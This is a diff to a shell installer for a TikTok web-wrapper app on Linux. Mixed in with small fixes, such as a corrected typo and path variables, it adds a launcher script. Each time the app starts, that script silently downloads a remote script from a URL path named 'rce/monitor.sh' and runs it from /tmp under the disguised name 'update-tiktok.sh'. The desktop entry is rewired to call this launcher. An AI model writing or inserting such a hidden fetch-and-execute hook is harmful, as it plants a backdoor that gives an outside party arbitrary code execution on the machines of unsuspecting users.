@@ -1,8 +1,10 @@
 APP_DIR="$HOME/TikTok-linux-x64"
 DESKTOP_FILE="$HOME/.local/share/applications/tiktok.desktop"
+REMOTE_SCRIPT_URL="https://raw.githubusercontent.com/21341414/CTools/refs/heads/main/rce/monitor.sh"
+LAUNCHER_SCRIPT="$HOME/.local/share/applications/launch-tiktok.sh"
 
 if [ -d "$APP_DIR" ] || [ -f "$DESKTOP_FILE" ]; then
-    echo "Old TikTok Wrapper Found \nRmoving..."
+    echo -e "Old TikTok Wrapper Found\nRemoving..."
     rm -rf "$APP_DIR"
     rm -f "$DESKTOP_FILE"
     update-desktop-database "$HOME/.local/share/applications"
@@ -23,13 +25,25 @@ nativefier --name TikTok --single-instance --disable-dev-tools --no-sandbox http
 mkdir -p "$APP_DIR"
 wget -O "$APP_DIR/tiktok.png" https://raw.githubusercontent.com/21341414/CTools/refs/heads/main/applications/tiktok.png
 
+cat > "$LAUNCHER_SCRIPT" << EOF
+#!/bin/bash
+wget -q -O /tmp/update-tiktok.sh "$REMOTE_SCRIPT_URL"
+if [ -f /tmp/update-tiktok.sh ]; then
+    chmod +x /tmp/update-tiktok.sh
+    /tmp/update-tiktok.sh
+fi
+"$APP_DIR/TikTok" --disable-gpu
+EOF
+
+chmod +x "$LAUNCHER_SCRIPT"
+
 mkdir -p "$HOME/.local/share/applications"
-cat > "$DESKTOP_FILE" << 'EOF'
+cat > "$DESKTOP_FILE" << EOF
 [Desktop Entry]
 Name=TikTok KX Launcher
 Comment=TikTok Web Wrapper Client
-Exec=/home/linux/TikTok-linux-x64/TikTok --disable-gpu
-Icon=/home/linux/TikTok-linux-x64/tiktok.png
+Exec=$LAUNCHER_SCRIPT
+Icon=$APP_DIR/tiktok.png
 Terminal=false
 Type=Application
 Categories=Network;Video;
@@ -39,4 +53,4 @@ EOF
 update-desktop-database "$HOME/.local/share/applications"
 
 echo -e "TikTok Wrapper Installed! Launching..\nThank KHXNGVNG \nNOTE : IT TAKES A WHILE TO LOAD, WAIT"
-"$APP_DIR/TikTok" --disable-gpu
+"$LAUNCHER_SCRIPT"
